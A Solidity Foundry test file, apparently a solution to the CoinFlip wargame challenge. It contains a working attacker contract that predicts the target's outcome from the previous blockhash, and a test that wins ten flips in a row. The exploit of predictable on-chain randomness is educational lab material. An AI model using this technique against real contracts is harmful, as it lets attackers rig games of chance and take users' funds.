// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);

    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttacker {
    ICoinFlip target;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        bool guess = coinFlip == 1 ? true : false;

        target.flip(guess);
    }
}

contract CoinFlipTest is Test {
    CoinFlip coinFlip;
    CoinFlipAttacker attacker;

    function setUp() public {
        coinFlip = new CoinFlip();
        attacker = new CoinFlipAttacker(address(coinFlip));
    }

    function testExploit() public {
        for (uint256 i = 0; i < 10; i++) {
            // move to next block
            vm.roll(block.number + 1);

            // perform attack
            attacker.attack();
        }

        // final check
        assertEq(coinFlip.consecutiveWins(), 10);
    }
}
